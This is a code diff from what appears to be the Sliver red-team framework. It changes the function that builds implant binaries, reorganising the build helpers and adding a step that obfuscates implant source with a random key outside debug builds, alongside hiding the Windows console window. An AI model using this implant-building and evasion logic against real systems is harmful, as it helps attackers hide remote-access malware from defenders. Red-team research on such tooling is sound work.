@@ -6,6 +6,8 @@ import (
 	"log"
 	"os"
 	"path"
+	gobfuscate "sliver/server/gobfuscate"
+	gogo "sliver/server/gogo"
 	"text/template"
 
 	"github.com/gobuffalo/packr"
@@ -50,7 +52,7 @@ func GenerateImplantBinary(goos string, goarch string, server string, lport uint
 	goos = path.Base(goos)
 	goarch = path.Base(goarch)
 	target := fmt.Sprintf("%s/%s", goos, goarch)
-	if _, ok := validCompilerTargets[target]; !ok {
+	if _, ok := gogo.ValidCompilerTargets[target]; !ok {
 		return "", fmt.Errorf("Invalid compiler target: %s", target)
 	}
 
@@ -71,22 +73,22 @@ func GenerateImplantBinary(goos string, goarch string, server string, lport uint
 	config.Key = string(sliverKey)
 
 	binDir := GetBinDir()
-	workingDir := path.Join(binDir, SliversDir, goos, goarch, config.Name)
-	os.MkdirAll(workingDir, os.ModePerm)
+	sourceDir := path.Join(binDir, SliversDir, goos, goarch, config.Name, "src")
+	os.MkdirAll(sourceDir, os.ModePerm)
 
 	// Load code template
 	sliverBox := packr.NewBox("../sliver")
-	saveCode(sliverBox, "handlers.go", workingDir)
-	saveCode(sliverBox, "handlers_windows.go", workingDir)
-	saveCode(sliverBox, "handlers_linux.go", workingDir)
-	saveCode(sliverBox, "handlers_darwin.go", workingDir)
-	saveCode(sliverBox, "ps.go", workingDir)
-	saveCode(sliverBox, "ps_windows.go", workingDir)
-	saveCode(sliverBox, "ps_linux.go", workingDir)
-	saveCode(sliverBox, "ps_darwin.go", workingDir)
+	saveCode(sliverBox, "handlers.go", sourceDir)
+	saveCode(sliverBox, "handlers_windows.go", sourceDir)
+	saveCode(sliverBox, "handlers_linux.go", sourceDir)
+	saveCode(sliverBox, "handlers_darwin.go", sourceDir)
+	saveCode(sliverBox, "ps.go", sourceDir)
+	saveCode(sliverBox, "ps_windows.go", sourceDir)
+	saveCode(sliverBox, "ps_linux.go", sourceDir)
+	saveCode(sliverBox, "ps_darwin.go", sourceDir)
 
 	sliverGoCode, _ := sliverBox.MustString("sliver.go")
-	sliverCodePath := path.Join(workingDir, "sliver.go")
+	sliverCodePath := path.Join(sourceDir, "sliver.go")
 	fSliver, _ := os.Create(sliverCodePath)
 	log.Printf("Rendering sliver code to: %s", sliverCodePath)
 	sliverCodeTmpl, _ := template.New("sliver").Parse(sliverGoCode)
@@ -97,14 +99,21 @@ func GenerateImplantBinary(goos string, goarch string, server string, lport uint
 	}
 
 	// Compile go code
-	goConfig := GoConfig{
+	appDir := GetRootAppDir()
+	goConfig := gogo.GoConfig{
 		GOOS:   goos,
 		GOARCH: goarch,
-		GOROOT: GetGoRootDir(),
-		GOPATH: GetGoPathDir(),
+		GOROOT: gogo.GetGoRootDir(appDir),
+		GOPATH: gogo.GetGoPathDir(appDir),
 	}
 
-	dest := path.Join(workingDir, config.Name)
+	if !debug {
+		log.Printf("Obfuscating source code ...")
+		obfuscatedDir := path.Join(binDir, SliversDir, goos, goarch, config.Name, "obfuscated")
+		gobfuscate.Gobfuscate(goConfig, randomEncryptKey(), "main", obfuscatedDir)
+	}
+
+	dest := path.Join(sourceDir, config.Name)
 	if goConfig.GOOS == "windows" {
 		dest += ".exe"
 	}
@@ -113,13 +122,13 @@ func GenerateImplantBinary(goos string, goarch string, server string, lport uint
 	if !debug && goConfig.GOOS == "windows" {
 		ldflags[0] += " -H=windowsgui"
 	}
-	_, err = GoBuild(goConfig, workingDir, dest, tags, ldflags)
+	_, err = gogo.GoBuild(goConfig, sourceDir, dest, tags, ldflags)
 	return dest, err
 }
 
-func saveCode(sliverBox packr.Box, fileName string, workingDir string) {
+func saveCode(sliverBox packr.Box, fileName string, sourceDir string) {
 	sliverPlatformCode, _ := sliverBox.MustString(fileName)
-	sliverPlatformCodePath := path.Join(workingDir, fileName)
+	sliverPlatformCodePath := path.Join(sourceDir, fileName)
 	err := ioutil.WriteFile(sliverPlatformCodePath, []byte(sliverPlatformCode), os.ModePerm)
 	if err != nil {
 		log.Printf("Error writing file %s: %s", sliverPlatformCodePath, err)
